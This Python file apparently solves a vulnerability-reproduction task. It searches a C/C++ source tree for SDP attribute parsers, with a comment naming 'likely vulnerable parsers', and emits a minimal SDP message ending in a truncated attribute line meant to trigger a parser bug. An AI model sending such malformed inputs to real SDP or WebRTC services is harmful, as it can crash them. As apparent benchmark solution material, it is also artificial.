import os
import tarfile
from typing import Iterable, Optional


class Solution:
    def _iter_source_chunks_from_tar(self, tar_path: str) -> Iterable[bytes]:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = (m.name or "").lower()
                    if not (name.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx"))):
                        continue
                    if m.size <= 0:
                        continue
                    if m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    try:
                        data = f.read(1_000_000)
                    finally:
                        f.close()
                    if data:
                        yield data
        except Exception:
            return

    def _iter_source_chunks_from_dir(self, root: str) -> Iterable[bytes]:
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                lfn = fn.lower()
                if not lfn.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx")):
                    continue
                p = os.path.join(dirpath, fn)
                try:
                    st = os.stat(p)
                except Exception:
                    continue
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                try:
                    with open(p, "rb") as f:
                        data = f.read(1_000_000)
                    if data:
                        yield data
                except Exception:
                    continue

    def _choose_trigger_attr(self, src_path: str) -> str:
        # Prefer likely vulnerable parsers.
        candidates = ["fmtp", "rtpmap", "rtcp-fb", "extmap", "rid", "msid", "ssrc", "fingerprint", "ice-ufrag", "ice-pwd"]
        found = {k: False for k in candidates}

        chunks: Iterable[bytes]
        if os.path.isdir(src_path):
            chunks = self._iter_source_chunks_from_dir(src_path)
        else:
            chunks = self._iter_source_chunks_from_tar(src_path)

        for data in chunks:
            low = data.lower()
            for k in candidates:
                if not found[k] and k.encode("ascii") in low:
                    found[k] = True
            if found["fmtp"]:
                break

        for k in ["fmtp", "rtpmap", "rtcp-fb", "extmap", "rid", "msid", "ssrc", "fingerprint", "ice-ufrag", "ice-pwd"]:
            if found.get(k):
                return k
        return "fmtp"

    def solve(self, src_path: str) -> bytes:
        attr = self._choose_trigger_attr(src_path)

        sdp_prefix = (
            "v=0\r\n"
            "o=- 0 0 IN IP4 127.0.0.1\r\n"
            "s=-\r\n"
            "t=0 0\r\n"
            "m=audio 9 UDP/TLS/RTP/SAVPF 111\r\n"
            "c=IN IP4 0.0.0.0\r\n"
        )

        if attr == "fmtp":
            sdp = sdp_prefix + "a=rtpmap:111 opus/48000/2\r\n" + "a=fmtp:111\r\n"
        elif attr == "rtpmap":
            sdp = sdp_prefix + "a=rtpmap:111\r\n"
        elif attr == "rtcp-fb":
            sdp = sdp_prefix + "a=rtcp-fb:111\r\n"
        elif attr == "extmap":
            sdp = sdp_prefix + "a=extmap:1\r\n"
        elif attr == "rid":
            sdp = sdp_prefix + "a=rid:1\r\n"
        elif attr == "msid":
            sdp = sdp_prefix + "a=msid:1\r\n"
        elif attr == "ssrc":
            sdp = sdp_prefix + "a=ssrc:1\r\n"
        elif attr == "fingerprint":
            sdp = sdp_prefix + "a=fingerprint:sha-256\r\n"
        elif attr == "ice-ufrag":
            sdp = sdp_prefix + "a=ice-ufrag:\r\n"
        elif attr == "ice-pwd":
            sdp = sdp_prefix + "a=ice-pwd:\r\n"
        else:
            sdp = sdp_prefix + "a=fmtp:111\r\n"

        return sdp.encode("ascii", "ignore")